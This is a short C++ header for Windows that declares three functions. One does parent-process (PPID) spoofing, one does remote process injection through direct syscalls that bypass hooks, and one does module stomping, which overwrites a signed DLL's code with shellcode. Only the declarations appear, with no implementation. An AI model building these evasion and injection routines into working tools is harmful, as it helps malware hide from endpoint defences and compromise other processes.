#pragma once
#include <windows.h>
#include <cstdint>

// PPID spoofing – launch a process under a legitimate parent
BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid, HANDLE* hProcess = nullptr);

// Unhooked remote process injection using direct syscalls
BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload, SIZE_T payloadSize, HANDLE* hThread = nullptr);

// Module stomping – overwrite .text of a signed DLL in a remote process
BOOL StompModule(DWORD pid, const wchar_t* dllPath, const BYTE* shellcode, SIZE_T shellcodeSize);